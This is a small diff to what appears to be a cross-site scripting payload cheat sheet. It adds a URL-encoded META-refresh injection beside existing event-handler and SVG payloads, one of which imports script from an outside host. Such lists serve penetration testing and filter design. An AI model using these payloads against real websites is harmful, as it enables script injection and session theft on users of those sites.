@@ -222,6 +222,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   " onmouseenter=confirm(1)//
   '%20onmouseenter=confirm(1)//
   <Svg+OnLoad=import(%27//X55.is%27)>#alert(document.domain)//
+  %22%27%22%3E%3CMETA%20HTTP-EQUIV%3Drefresh%20CONTENT%3D1%3E%3F%3D
   ```
 </details>
 
